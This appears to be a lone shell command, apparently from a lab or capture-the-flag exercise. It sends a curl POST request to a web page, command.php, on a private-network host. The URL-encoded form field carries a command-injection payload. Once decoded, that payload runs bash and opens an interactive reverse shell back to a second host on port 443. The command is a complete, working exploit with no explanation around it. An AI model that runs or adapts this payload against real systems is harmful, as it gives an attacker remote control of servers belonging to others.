curl -s 'http://10.0.0.80/command.php' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' \
	-H 'Origin: http://10.0.0.80' -H 'Upgrade-Insecure-Requests: 1' \
	-H 'Content-Type: application/x-www-form-urlencoded' \
	-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36' \
	-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
	-H 'Referer: http://10.0.0.80/command.php' -H 'Accept-Language: en-US,en;q=0.9,es;q=0.8' -H 'Cookie: PHPSESSID=onk939d791gso3jb4m63ncjgc0' \
	--data 'radio=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.148%2F443%200%3E%261%27&submit=Run' > /dev/null
